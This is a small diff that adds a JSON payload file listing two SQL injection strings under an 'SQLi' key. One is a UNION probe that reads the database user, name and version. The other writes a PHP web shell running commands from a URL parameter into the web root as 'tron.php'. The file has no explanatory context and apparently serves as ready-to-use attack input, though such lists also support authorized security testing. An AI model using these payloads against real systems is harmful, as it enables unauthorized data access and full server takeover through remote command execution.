@@ -1,0 +1,6 @@
+{
+  "SQLi": [
+    "' UNION SELECT NULL, user(), database(), version() --",
+    "' UNION SELECT \\\"<?php system($_GET['cmd']); ?>\\\" INTO OUTFILE '/var/www/html/tron.php' --"
+  ]
+}
